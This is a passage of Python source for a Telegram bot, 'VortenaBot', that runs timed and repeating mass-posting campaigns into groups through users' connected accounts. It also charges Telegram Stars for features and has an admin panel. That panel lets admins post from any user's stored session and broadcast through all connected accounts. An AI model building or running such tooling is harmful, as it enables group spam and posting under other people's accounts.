    auto_tasks[user_id] = asyncio.create_task(run_auto_campaign(user_id, text, message.chat.id))
    await message.answer(
        f"🟢 <b>Авторассылка запущена!</b>\nИнтервал между циклами: {AUTO_INTERVAL_LABELS[seconds]}.\n"
        "Для остановки нажмите «⏹ Стоп авторассылки» или кнопку остановки в панели.",
        reply_markup=MAIN_KB, parse_mode="HTML")
    panel_chat_id = state_data.get("auto_panel_chat_id")
    panel_message_id = state_data.get("auto_panel_message_id")
    if panel_chat_id and panel_message_id:
        auto_panel_refs[user_id] = (int(panel_chat_id), int(panel_message_id))
    await refresh_auto_panel(user_id)


async def run_auto_campaign(user_id: int, text: str, chat_id: int):
    """Run recurring cycles until stopped; recoverable errors are logged and retried."""
    log.info("Auto-broadcast task started for user %s", user_id)
    try:
        while True:
            try:
                log.info("Auto-broadcast cycle starting for user %s", user_id)
                result = await sender.send_campaign(user_id, text, delay_seconds=0)
                msg = ("🤖 <b>Цикл авторассылки завершён</b>\n"
                       f"✅ Отправлено: {result['sent']}\n"
                       f"⚠️ Ошибок: {result['failed']}")
                if result.get("errors"):
                    msg += "\n\n" + "\n".join(f"• {html.escape(str(e))}" for e in result["errors"][:5])
                log.info(
                    "Auto-broadcast cycle completed for user %s: sent=%s failed=%s; next cycle after configured interval",
                    user_id, result.get("sent", 0), result.get("failed", 0),
                )
                with suppress(Exception):
                    await bot.send_message(chat_id, msg, parse_mode="HTML")
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                # Keep the campaign enabled after transient DB/network/session failures.
                log.exception("Auto-broadcast cycle failed for user %s; retrying after interval", user_id)
                with suppress(Exception):
                    await bot.send_message(
                        chat_id,
                        f"⚠️ Цикл авторассылки завершился с ошибкой: {html.escape(type(exc).__name__)}. Повторю через выбранный интервал.",
                        parse_mode="HTML",
                    )
            interval = await get_auto_interval(user_id)
            log.info("Auto-broadcast user %s sleeping %s seconds before next cycle", user_id, interval)
            await asyncio.sleep(interval)
    except asyncio.CancelledError:
        if not shutting_down:
            with suppress(Exception):
                await bot.send_message(chat_id, "⏹ Авторассылка остановлена.")
        else:
            log.info("Auto-broadcast for user %s paused for process shutdown; persisted as enabled", user_id)
        raise
    except Exception as exc:
        log.exception("Auto-broadcast task failed permanently for user %s", user_id)
        with suppress(Exception):
            await db.disable_auto_campaign(user_id)
        with suppress(Exception):
            await bot.send_message(chat_id, f"❌ Авторассылка остановлена из-за критической ошибки: {html.escape(type(exc).__name__)}.")
    finally:
        current = auto_tasks.get(user_id)
        if current is asyncio.current_task():
            auto_tasks.pop(user_id, None)
        if not shutting_down:
            with suppress(Exception):
                await db.disable_auto_campaign(user_id)
        with suppress(Exception):
            await refresh_auto_panel(user_id)


@dp.callback_query(F.data == "auto:stop")
async def auto_stop_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    task = auto_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        await callback.answer("Остановка запрошена")
    else:
        await callback.answer("Авторассылка уже отключена", show_alert=True)
        await refresh_auto_panel(user_id)


async def stop_auto(message: Message):
    user_id = message.from_user.id
    task = auto_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        await message.answer("⏹ Запрос на остановку авторассылки отправлен.", reply_markup=MAIN_KB)
    else:
        await message.answer("🔴 Авторассылка уже отключена.", reply_markup=MAIN_KB)
    await refresh_auto_panel(user_id)


@dp.message(F.text == "⏳ Интервал")
async def delay_menu(message: Message):
    user = await require_user(message)
    kb = with_close([
        [InlineKeyboardButton(text="2 мин", callback_data="delay:120"),
         InlineKeyboardButton(text="3 мин", callback_data="delay:180"),
         InlineKeyboardButton(text="5 мин", callback_data="delay:300")],
        [InlineKeyboardButton(text="10 мин", callback_data="delay:600"),
         InlineKeyboardButton(text="15 мин", callback_data="delay:900"),
         InlineKeyboardButton(text="20 мин", callback_data="delay:1200")],
    ])
    await message.answer(f"Текущий интервал: {user['delay_seconds']//60} мин.\n⚠️ Слишком маленький интервал может привести к ограничениям аккаунта.", reply_markup=kb)

@dp.callback_query(F.data.startswith("delay:"))
async def set_delay_callback(callback: CallbackQuery):
    delay = int(callback.data.split(":")[1])
    if delay < config.min_delay or delay > config.max_delay:
        await callback.answer("Интервал вне допустимого диапазона.", show_alert=True)
        return
    await db.set_delay(callback.from_user.id, delay)
    await callback.answer(f"Интервал: {delay//60} мин")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "✍️ Подпись")
async def signature_menu(message: Message):
    user = await require_user(message)
    enabled = user["signature_enabled"]
    if enabled:
        kb = with_close([[InlineKeyboardButton(text="⭐ Отключить подпись", callback_data="signature:off")]])
        await message.answer("Подпись включена:\nотправлено через @VortenaBot", reply_markup=kb)
    else:
        kb = with_close([[InlineKeyboardButton(text="✅ Включить подпись", callback_data="signature:on")]])
        await message.answer("Подпись выключена.", reply_markup=kb)

@dp.callback_query(F.data.startswith("signature:"))
async def signature_toggle(callback: CallbackQuery):
    enabled = callback.data.endswith("on")
    if not enabled:
        price = await db.get_price("unsign_price")
        if price > 0 and not await admin_check(callback.from_user.id):
            await bot.send_invoice(
                chat_id=callback.from_user.id,
                title="Отключение подписи",
                description="Отключить подпись «Отправлено через @VortenaBot» в рассылках.",
                payload=f"unsign:{callback.from_user.id}",
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label="Отключение подписи", amount=price)],
            )
            await callback.answer("Оплатите счёт Telegram Stars.")
            return
    await db.set_signature(callback.from_user.id, enabled)
    signature_cache[callback.from_user.id] = enabled
    await callback.answer("Подпись включена" if enabled else "Подпись отключена")
    if callback.message:
        with suppress(TelegramBadRequest):
            await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "⭐ Мои звёзды")
async def my_stars(message: Message):
    user = await require_user(message)
    await message.answer(f"⭐ Ваш баланс: {user['stars']} звёзд")

@dp.message(F.text == "⏱ Рассылка по таймеру")
async def timer_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "timer_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    if not await db.selected_groups(message.from_user.id):
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.timer_text)
    await message.answer("Отправьте текст рассылки.")

@dp.message(TextFlow.timer_text)
async def timer_text(message: Message, state: FSMContext):
    await state.update_data(timer_text=(message.text or "").strip())
    await state.set_state(TextFlow.timer_datetime)
    await message.answer("Укажите время запуска в формате YYYY-MM-DD HH:MM (UTC), например 2026-12-31 18:30.")

@dp.message(TextFlow.timer_datetime)
async def timer_datetime(message: Message, state: FSMContext):
    try:
        run_at = datetime.strptime((message.text or "").strip(), "%Y-%m-%d %H:%M").replace(tzinfo=timezone.utc)
    except ValueError:
        await message.answer("Неверный формат. Пример: 2026-12-31 18:30")
        return
    if run_at <= datetime.now(timezone.utc):
        await message.answer("Время должно быть в будущем.")
        return
    data = await state.get_data()
    text = data.get("timer_text", "")
    await state.clear()
    task_id = await db.create_task(message.from_user.id, "timer", text, run_at)
    previous = timer_tasks.get(message.from_user.id)
    if previous and not previous.done():
        previous.cancel()
    timer_tasks[message.from_user.id] = asyncio.create_task(run_timer(message.from_user.id, task_id, text, run_at, message.chat.id))
    await message.answer(f"⏱ Таймер №{task_id} сохранён. Запуск: {run_at.strftime('%Y-%m-%d %H:%M UTC')}")

async def run_timer(user_id: int, task_id: int, text: str, run_at: datetime, chat_id: int):
    try:
        delay = max(0, (run_at - datetime.now(timezone.utc)).total_seconds())
        await asyncio.sleep(delay)
        await db.update_task(task_id, "running")
        result = await sender.send_campaign(user_id, text)
        status = "completed" if not result["stopped"] else "stopped"
        await db.update_task(task_id, status, result)
        report = f"Таймер №{task_id} завершён.\nОтправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, report)
    except asyncio.CancelledError:
        await db.update_task(task_id, "cancelled")
        raise
    except Exception as exc:
        log.exception("Timer failed")
        await db.update_task(task_id, "failed", {"error": str(exc)})
        await bot.send_message(chat_id, f"Таймер #{task_id} завершился с ошибкой: {type(exc).__name__}.")
    finally:
        timer_tasks.pop(user_id, None)

@dp.message(F.text == "📋 Мои задачи")
async def my_tasks(message: Message):
    tasks = await db.list_tasks(message.from_user.id)
    if not tasks:
        await message.answer("Задач пока нет.")
        return
    type_names = {"timer": "Таймер", "broadcast": "Рассылка"}
    status_names = {"pending": "Ожидает", "running": "Выполняется", "completed": "Завершена", "stopped": "Остановлена", "cancelled": "Отменена", "failed": "Ошибка"}
    lines = [f"№{t['id']} · {type_names.get(t['task_type'], t['task_type'])} · {status_names.get(t['status'], t['status'])} · {t['created_at'].strftime('%Y-%m-%d %H:%M')}" for t in tasks[:30]]
    await message.answer("\n".join(lines))

# Панель администратора: все действия администратора бесплатны; цены применяются только к обычным пользователям.
async def show_users_page(message: Message, page: int):
    users = await db.list_users()
    page_size = 10
    pages = max(1, (len(users) + page_size - 1) // page_size)
    page = max(0, min(page, pages - 1))
    chunk = users[page * page_size:(page + 1) * page_size]
    if not chunk:
        await message.answer("Список пользователей пуст.")
        return
    lines = [f"👥 <b>Пользователи</b> · всего: {len(users)} · страница {page + 1}/{pages}", ""]
    for u in chunk:
        username = f"@{u['username']}" if u["username"] else "без username"
        connected = "🟢 подключён" if u["connected"] else "⚪ не подключён"
        safe_name = html.escape(str(u['full_name'] or 'Без имени'))
        safe_username = html.escape(username)
        lines.append(f"• <b>{safe_name}</b>\n  ID: <code>{u['user_id']}</code> · {safe_username}\n  ⭐ {u['stars']} · {connected}")
    rows = []
    for u in chunk:
        rows.append([
            InlineKeyboardButton(text=f"➕ Рассылка {u['user_id']}", callback_data=f"ucamp:add:{u['user_id']}"),
            InlineKeyboardButton(text="⚙️ Управление", callback_data=f"uadmin:{u['user_id']}")
        ])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users:{page-1}"))
    if page + 1 < pages:
        nav.append(InlineKeyboardButton(text="Вперёд ➡️", callback_data=f"users:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔄 Обновить", callback_data=f"users:{page}")])
    await message.answer("\n".join(lines), parse_mode="HTML", reply_markup=with_close(rows))

@dp.callback_query(F.data.startswith("users:"))
async def users_page_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    page = int(callback.data.split(":", 1)[1])
    await show_users_page(callback.message, page)
    await callback.answer()

@dp.callback_query(F.data.startswith("uadmin:"))
async def admin_user_manage(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True); return
    value = callback.data.split(":", 1)[1]
    await callback.answer()
    if value == "add":
        await state.set_state(AdminFlow.add_user_campaign_id)
        await callback.message.answer("Отправьте ID пользователя, для которого нужно добавить авторассылку.")
        return
    try: target = int(value)
    except ValueError: return
    user = await db.get_user(target)
    if not user:
        await callback.message.answer("Пользователь не найден."); return
    campaign = await db.get_auto_campaign(target)
    running = target in auto_tasks and not auto_tasks[target].done()
    groups = await db.list_groups(target)
    selected_count = sum(1 for g in groups if g["is_selected"] and g["can_send"])
    text = (f"👤 Пользователь: {target}\nUsername: @{user['username'] or '—'}\n"
            f"Аккаунт: {'подключён' if user['session_string'] else 'не подключён'}\n"
            f"Подпись: {'включена' if user['signature_enabled'] else 'выключена'}\n"
            f"Группы: выбрано {selected_count} из {len(groups)}\n"
            f"Авторассылка: {'работает' if running else 'не запущена'}\n"
            f"Текст: {(campaign['message_text'][:500] if campaign else 'не задан')}")
    rows = [[InlineKeyboardButton(text="➕ Добавить рассылку", callback_data=f"ucamp:add:{target}")],
            [InlineKeyboardButton(text="✏️ Изменить текст", callback_data=f"ucamp:edit:{target}")],
            [InlineKeyboardButton(text="▶️ Запустить" if not running else "⏹ Остановить", callback_data=f"ucamp:toggle:{target}")],
            [InlineKeyboardButton(text="✍️ Подпись ВКЛ/ВЫКЛ", callback_data=f"ucamp:signature:{target}")]]
    for g in groups[:15]:
        mark = "✅" if g["is_selected"] else "⬜️"
        rows.append([InlineKeyboardButton(text=f"{mark} {str(g['title'] or g['chat_id'])[:35]}", callback_data=f"ucamp:group:{target}:{g['chat_id']}")])
    if len(groups) > 15:
        text += "\nПоказаны первые 15 групп; пользователь может выбрать остальные в меню «Группы»."
    rows.append([InlineKeyboardButton(text="⬅️ К пользователям", callback_data="adm:users")])
    await callback.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.callback_query(F.data.startswith("ucamp:"))
async def admin_campaign_action(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True); return
    parts = callback.data.split(":")
    action = parts[1]
    if action == "group" and len(parts) == 4:
        target, chat_id = int(parts[2]), int(parts[3])
        row = await db.toggle_group(target, chat_id)
        await callback.answer("Группа выбрана" if row and row["is_selected"] else "Выбор группы снят")
        user = await db.get_user(target)
        if user:
            campaign = await db.get_auto_campaign(target)
            running = target in auto_tasks and not auto_tasks[target].done()
            groups = await db.list_groups(target)
            selected_count = sum(1 for g in groups if g["is_selected"] and g["can_send"])
            text = (f"👤 Пользователь: {target}\nUsername: @{user['username'] or '—'}\n"
                    f"Аккаунт: {'подключён' if user['session_string'] else 'не подключён'}\n"
                    f"Подпись: {'включена' if user['signature_enabled'] else 'выключена'}\n"
                    f"Группы: выбрано {selected_count} из {len(groups)}\n"
                    f"Авторассылка: {'работает' if running else 'не запущена'}\n"
                    f"Текст: {(campaign['message_text'][:500] if campaign else 'не задан')}")
            rows = [[InlineKeyboardButton(text="➕ Добавить рассылку", callback_data=f"ucamp:add:{target}")],
                    [InlineKeyboardButton(text="✏️ Изменить текст", callback_data=f"ucamp:edit:{target}")],
                    [InlineKeyboardButton(text="▶️ Запустить" if not running else "⏹ Остановить", callback_data=f"ucamp:toggle:{target}")],
                    [InlineKeyboardButton(text="✍️ Подпись ВКЛ/ВЫКЛ", callback_data=f"ucamp:signature:{target}")]]
            for g in groups[:15]:
                mark = "✅" if g["is_selected"] else "⬜️"
                rows.append([InlineKeyboardButton(text=f"{mark} {str(g['title'] or g['chat_id'])[:35]}", callback_data=f"ucamp:group:{target}:{g['chat_id']}")])
            rows.append([InlineKeyboardButton(text="⬅️ К пользователям", callback_data="adm:users")])
            with suppress(TelegramBadRequest):
                await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
        return
    target = int(parts[2]) if len(parts) > 2 else 0
    await callback.answer()
    if action == "add":
        await state.update_data(admin_campaign_target=target)
        await state.set_state(AdminFlow.edit_user_campaign_text)
        await callback.message.answer(f"Отправьте текст рассылки для пользователя {target}. Текст сохранится и авторассылка запустится в выбранных группах.")
    elif action == "edit":
        await state.update_data(admin_campaign_target=target)
        await state.set_state(AdminFlow.edit_user_campaign_text)
        await callback.message.answer("Отправьте новый текст авторассылки. Упоминания можно включить прямо в текст.")
    elif action == "signature":
        user = await db.get_user(target)
        if user:
            await db.set_signature(target, not user['signature_enabled'])
            signature_cache[target] = not user['signature_enabled']
            await callback.message.answer("Подпись " + ("включена" if not user['signature_enabled'] else "выключена") + f" для {target}.")
    elif action == "toggle":
        task = auto_tasks.get(target)
        if task and not task.done():
            task.cancel(); await db.disable_auto_campaign(target)
            await callback.message.answer(f"Авторассылка пользователя {target} остановлена.")
        else:
            campaign = await db.get_auto_campaign(target); user = await db.get_user(target)
            groups = await db.selected_groups(target)
            if not campaign or not user or not user['session_string'] or not groups:
                await callback.message.answer("Нужны сохранённый текст, подключённый аккаунт и выбранные группы пользователя."); return
            await db.set_auto_campaign_enabled(target, True)
            auto_tasks[target] = asyncio.create_task(run_auto_campaign(target, campaign['message_text'], int(campaign['notify_chat_id'])))
            await callback.message.answer(f"Авторассылка пользователя {target} запущена.")

@dp.message(AdminFlow.add_user_campaign_id)
async def admin_campaign_id(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id): await state.clear(); return
    try: target = int((message.text or '').strip())
    except ValueError: await message.answer("ID должен быть числом."); return
    user = await db.get_user(target)
    if not user:
        await message.answer("Пользователь не найден."); await state.clear(); return
    await state.update_data(admin_campaign_target=target)
    await state.set_state(AdminFlow.edit_user_campaign_text)
    await message.answer("Отправьте текст авторассылки для этого пользователя.")

@dp.message(AdminFlow.edit_user_campaign_text)
async def admin_campaign_save(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id): await state.clear(); return
    data = await state.get_data(); target = int(data['admin_campaign_target']); text_value = (message.text or '').strip()
    if not text_value: await message.answer("Текст не должен быть пустым."); return
    user = await db.get_user(target)
    if not user:
        await message.answer("Пользователь не найден."); await state.clear(); return
    try:
        task = auto_tasks.get(target)
        if task and not task.done():
            task.cancel()
            with suppress(asyncio.CancelledError):
                await task
        await db.save_auto_campaign(target, text_value, message.chat.id)
        groups = await db.selected_groups(target)
        if user['session_string'] and groups:
            auto_tasks[target] = asyncio.create_task(run_auto_campaign(target, text_value, message.chat.id))
            await message.answer(f"Текст авторассылки для {target} сохранён и запущен в {len(groups)} выбранных группах.")
        else:
            await db.set_auto_campaign_enabled(target, False)
            await message.answer(f"Текст рассылки для {target} сохранён. Чтобы запустить, пользователь должен подключить аккаунт и выбрать группы либо администратор должен отметить группы выше.")
    except Exception as exc:
        await message.answer(f"Не удалось сохранить: {type(exc).__name__}: {exc}")
    await state.clear()

@dp.callback_query(F.data.startswith("adm:"))
async def admin_actions(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    action = callback.data.split(":", 1)[1]
    await callback.answer()
    if action == "add_user":
        await state.set_state(AdminFlow.add_user)
        await callback.message.answer("Отправьте Telegram ID пользователя.")
    elif action == "add_admin":
        await state.set_state(AdminFlow.add_admin)
        await callback.message.answer("Отправьте Telegram ID нового администратора.")
    elif action == "admins":
        rows, supers = await db.list_admins(config.super_admins)
        text = "👑 Суперадминистраторы:\n" + ("\n".join(map(str, supers)) or "—")
        text += "\n\nДополнительные администраторы:\n" + ("\n".join(str(r["user_id"]) for r in rows) or "—")
        await callback.message.answer(text)
    elif action == "stars":
        await state.set_state(AdminFlow.give_stars)
        await callback.message.answer("Отправьте ID пользователя и количество звёзд в одной строке: ID 100")
    elif action == "prices":
        prices = [f"{key} = {await db.get_price(key)} ⭐" for key in PRICE_KEYS]
        kb = with_close([
            [InlineKeyboardButton(text=f"{label}: {await db.get_price(key)} ⭐", callback_data=f"price:{key}")]
            for key, label in PRICE_KEYS.items()
        ])
        await callback.message.answer("Нажмите на цену, чтобы изменить её:\n" + "\n".join(prices), reply_markup=kb)
    elif action == "subs":
        subs = await db.list_force_subs()
        kb = with_close([
            [InlineKeyboardButton(text=f"❌ №{s['id']} {s['chat_ref']}", callback_data=f"subdel:{s['id']}")]
            for s in subs
        ] + [[InlineKeyboardButton(text="➕ Добавить", callback_data="subadd")]])
        await callback.message.answer("Обязательная подписка. Бот должен состоять в канале/группе и иметь право проверять участников.", reply_markup=kb)
    elif action == "user_broadcast":
        await state.set_state(AdminFlow.admin_user_broadcast_id)
        await callback.message.answer("Отправьте ID пользователя, от имени подключённого аккаунта которого нужно отправить сообщение.")
    elif action == "global_broadcast":
        await state.set_state(AdminFlow.global_broadcast_text)
        await callback.message.answer("Отправьте текст общей рассылки. Он будет отправлен в выбранные группы каждого подключённого аккаунта.")
    elif action == "csv":
        users = await db.list_users()
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["user_id", "username", "full_name", "stars", "connected", "created_at"])
        for u in users:
            writer.writerow([u["user_id"], u["username"], u["full_name"], u["stars"], u["connected"], u["created_at"]])
        await callback.message.answer_document(BufferedInputFile(buf.getvalue().encode("utf-8-sig"), filename="VortenaBot_users.csv"))
    elif action == "users":
        await show_users_page(callback.message, 0)
    elif action == "stats":
        s = await db.stats()
        await callback.message.answer(
            f"📊 Статистика\nПользователи: {s['users']}\nПодключённые аккаунты: {s['connected']}\nГруппы: {s['groups']}\nОжидающие задачи: {s['tasks_pending']}\nДополнительные администраторы: {s['admins']}"
        )
    elif action == "refresh_user":
        await state.set_state(AdminFlow.refresh_user)
        await callback.message.answer("Отправьте ID пользователя для просмотра его данных.")
    elif action == "remove_admin":
        await state.set_state(AdminFlow.remove_admin)
        await callback.message.answer("Отправьте ID администратора для удаления. Суперадминистратора нельзя удалить этим способом.")

@dp.callback_query(F.data.startswith("price:"))
async def price_select(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    key = callback.data.split(":", 1)[1]
    if key not in PRICE_KEYS:
        await callback.answer("Цена не найдена.", show_alert=True)
        return
    await state.update_data(price_key=key)
    await state.set_state(AdminFlow.price_value)
    await callback.message.answer(f"Отправьте новую цену для «{PRICE_KEYS[key]}» в звёздах. 0 = бесплатно.")
    await callback.answer()

@dp.callback_query(F.data == "subadd")
async def subadd_callback(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await state.set_state(AdminFlow.force_sub)
    await callback.message.answer("Отправьте username или ID канала/группы (например, @mychannel). Для кнопки подписки лучше использовать публичный username или ссылку.")
    await callback.answer()

@dp.callback_query(F.data.startswith("subdel:"))
async def subdel_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await db.delete_force_sub(int(callback.data.split(":")[1]))
    await callback.answer("Удалено")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(AdminFlow.add_user)
async def admin_add_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.upsert_user(user_id, None, "")
        await db.log_admin_action(message.from_user.id, "add_user", user_id)
        await message.answer(f"Пользователь {user_id} добавлен.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.add_admin)
async def admin_add_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.add_admin(user_id, message.from_user.id)
        await db.log_admin_action(message.from_user.id, "add_admin", user_id)
        await message.answer(f"Пользователь {user_id} назначен администратором.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.give_stars)
async def admin_give_stars(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        parts = (message.text or "").split()
        user_id, amount = int(parts[0]), int(parts[1])
        if amount <= 0:
            raise ValueError("Количество должно быть положительным.")
        balance = await db.add_stars(user_id, amount)
        await db.log_admin_action(message.from_user.id, "give_stars", user_id, {"amount": amount})
        await message.answer(f"Пользователю {user_id} {amount} звёзд начислено. Баланс: {balance}")
    except Exception as exc:
        await message.answer(f"Формат: ID 100. Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.price_value)
async def admin_price_value(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        amount = int((message.text or "").strip())
        if amount < 0:
            raise ValueError("Цена не может быть отрицательной.")
        await db.set_price(data["price_key"], amount)
        await message.answer(f"Цена обновлена: {PRICE_KEYS[data['price_key']]} = {amount} ⭐. Для администраторов все функции остаются бесплатными.")
    except Exception as exc:
        await message.answer(f"Цена должна быть числом от 0 и выше: {exc}")
    await state.clear()

@dp.message(AdminFlow.force_sub)
async def admin_force_sub(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    ref = (message.text or "").strip()
    if not ref:
        await message.answer("Отправьте username или ID.")
        return
    label = ref
    try:
        await db.add_force_sub(ref, label)
        await message.answer(f"Обязательная подписка добавлена: {ref}")
    except Exception as exc:
        await message.answer(f"Не удалось добавить: {exc}")
    await state.clear()

@dp.message(AdminFlow.admin_user_broadcast_id)
async def admin_user_broadcast_id(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        target = int((message.text or "").strip())
        user = await db.get_user(target)
        if not user or not user["session_string"]:
            await message.answer("Пользователь не найден в базе или его аккаунт не подключён.")
            await state.clear()
            return
        await state.update_data(target_id=target)
        await state.set_state(AdminFlow.admin_user_broadcast_text)
        await message.answer("Отправьте текст сообщения.")
    except ValueError:
        await message.answer("ID должен быть числом.")

@dp.message(AdminFlow.admin_user_broadcast_text)
async def admin_user_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        result = await sender.send_to_account(data["target_id"], (message.text or "").strip())
        report = f"Готово. Отправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await message.answer(report)
        await db.log_admin_action(message.from_user.id, "user_broadcast", data["target_id"], result)
    except Exception as exc:
        await message.answer(f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    await state.clear()

@dp.message(AdminFlow.global_broadcast_text)
async def admin_global_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    await state.clear()
    await message.answer("Общая рассылка запущена; это может занять некоторое время.")
    results = await sender.broadcast_all((message.text or "").strip())
    await message.answer(f"Общая рассылка завершена. Обработано аккаунтов: {len(results)}.")

@dp.message(AdminFlow.refresh_user)
async def admin_refresh_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        user = await db.get_user(user_id)
        if not user:
            await message.answer("Пользователь отсутствует в базе данных.")
        else:
            await message.answer(
                f"ID: {user['user_id']}\nUsername: @{user['username'] or '—'}\nИмя: {user['full_name']}\nЗвёзды: {user['stars']}\nПодключён: {'да' if user['session_string'] else 'нет'}\nИнтервал: {user['delay_seconds']} сек.\nПодпись: {'включена' if user['signature_enabled'] else 'выключена'}"
            )
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.remove_admin)
async def admin_remove_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        if is_super(user_id):
            await message.answer("Суперадминистратора нельзя удалить отсюда.")
        else:
            await db.remove_admin(user_id)
            await db.log_admin_action(message.from_user.id, "remove_admin", user_id)
            await message.answer(f"Админ {user_id} удалён.")
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message()
async def unknown_message(message: Message):
    if message.from_user:
        await message.answer("Выберите действие в меню или нажмите /start.")

async def health(request):
    return web.Response(text="VortenaBot is alive", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.port)
    await site.start()
    log.info("Health server listening on port %s", config.port)
    return runner

async def main():
    await db.init_db(config.database_url)
    await bot.set_my_commands([
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="menu", description="Открыть главное меню"),
        BotCommand(command="admin", description="Панель администратора"),
        BotCommand(command="users", description="Список пользователей (админ)"),
    ])
    # Super-admin IDs аз ENV ба admins низ ворид мешаванд, аммо иҷозаташон всегда аз ENV санҷида мешавад.
    async with db.get_pool().acquire() as con:
        for admin_id in config.super_admins:
            await con.execute("INSERT INTO admins(user_id, added_by) VALUES($1,$1) ON CONFLICT(user_id) DO NOTHING", admin_id)
    runner = await start_health_server()
    # Restore campaigns that were enabled before a Render restart/redeploy.
    try:
        active_campaigns = await db.get_active_auto_campaigns()
    except Exception:
        log.exception("Could not load persisted auto-broadcast campaigns")
        active_campaigns = []
    for campaign in active_campaigns:
        user_id = int(campaign["user_id"])
        if user_id in auto_tasks and not auto_tasks[user_id].done():
            continue
        auto_tasks[user_id] = asyncio.create_task(
            run_auto_campaign(user_id, str(campaign["message_text"]), int(campaign["notify_chat_id"]))
        )
        log.info("Restored auto-broadcast campaign for user %s", user_id)
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        global shutting_down
        shutting_down = True
        for task in list(campaign_tasks.values()) + list(timer_tasks.values()) + list(auto_tasks.values()):
            task.cancel()
        for client in list(login_clients.values()):
            with suppress(Exception):
                await client.disconnect()
        await runner.cleanup()
        await bot.session.close()
        if db.pool:
            await db.pool.close()

if __name__ == "__main__":
    asyncio.run(main())
